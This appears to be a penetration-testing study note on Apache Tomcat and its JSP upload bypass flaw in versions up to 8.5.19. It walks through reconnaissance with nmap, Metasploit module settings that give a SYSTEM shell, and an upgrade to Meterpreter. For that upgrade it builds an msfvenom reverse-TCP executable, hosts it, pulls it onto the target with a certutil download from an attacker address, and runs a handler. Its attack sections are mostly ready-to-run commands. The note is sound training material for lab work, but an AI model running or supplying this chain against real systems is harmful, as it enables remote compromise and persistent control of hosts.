## ðŸ” What Is Apache Tomcat?

- **Java-based web server** for hosting dynamic Java web apps (JSP/Servlets)
- **Default port**: `8080/TCP`
- **Not the same as Apache HTTP Server**:
  - **Apache HTTP**: Hosts static content + PHP apps
  - **Tomcat**: Hosts **Java-based** apps (JSP = Java Server Pages)

> ðŸ’¡ **JSP** = Javaâ€™s equivalent of PHP â€” allows embedded Java code in HTML

---
## ðŸŽ¯ Vulnerability: Tomcat JSP Upload Bypass

- **Affected version**: Apache Tomcat â‰¤ 8.5.19
- **Flaw**: Allows unauthenticated upload of malicious JSP files
- **Result**: **Remote Code Execution (RCE)** as the Tomcat user (often `root` or `SYSTEM`)

---
## ðŸ› ï¸ Exploitation Workflow

### Step 1: Recon
```bash
nmap -sV -p 8080 192.168.1.10
```
âœ… Output:  
`8080/tcp open  http    Apache Tomcat 8.5.19`

---
### Step 2: Exploit with Metasploit
```msf
search type:exploit name:tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS 192.168.1.10
set RPORT 8080
set payload java/jsp_shell_bind_tcp
set LPORT 4444
set SHELL cmd        # â† Windows target
exploit
```

> â“ **How to know valid `SHELL` values?**  
> - **Windows**: `cmd`, `powershell`  
> - **Linux**: `/bin/sh`, `/bin/bash`  
> â†’ Check OS via `nmap -O` or service banners

âœ… Result: **Raw shell session** (`C:\>`), running as `NT AUTHORITY\SYSTEM`

---
## âš ï¸ Critical Limitation: Raw Shell â‰  Meterpreter

- Session type: `shell java/windows` (not Meterpreter)
- **Cannot upgrade to Meterpreter** using `sessions -u` because:
  - Payload is **Java-based** (`java/jsp_shell_bind_tcp`)
  - Meterpreter requires **native OS payload** (Windows/Linux binary)

> ðŸ”¥ **Key Insight**:  
> Java payloads **cannot be upgraded** to Meterpreter â€” you must deliver a native payload separately.

---
## ðŸ’¥ Upgrading to Meterpreter

### Step 1: Generate Native Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f exe > meterpreter.exe
```

### Step 2: Host Payload
```bash
sudo python3 -m http.server 80
```

### Step 3: Download on Target
In raw Tomcat shell:
```cmd
certutil -urlcache -f http://10.10.100.8/meterpreter.exe meterpreter.exe
```

### Step 4: Set Up Handler
Create `handler.rc`:
```rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.100.8
set LPORT 4444
run
```

Start handler:
```bash
msfconsole -r handler.rc
```

### Step 5: Execute Payload
In Tomcat shell:
```cmd
.\meterpreter.exe
```

âœ… Result: **Meterpreter session** as `NT AUTHORITY\SYSTEM`

---
## ðŸ”‘ Key Takeaways

| Concept | Explanation |
|--------|------------|
| **Tomcat â‰  Apache HTTP** | Tomcat = Java apps; Apache = PHP/static |
| **JSP Upload = RCE** | Malicious `.jsp` â†’ command execution |
| **Java shells canâ€™t upgrade** | Must deliver native payload for Meterpreter |
| **`SHELL` setting** | Match target OS: `cmd` (Windows), `/bin/sh` (Linux) |
| **Post-exploitation** | Always migrate to Meterpreter for full functionality |

> ðŸ”¥ **Golden Rule**:  
> **Java payloads are dead ends for post-exploitation.**  
> Always deliver a native Meterpreter payload immediately after initial access.

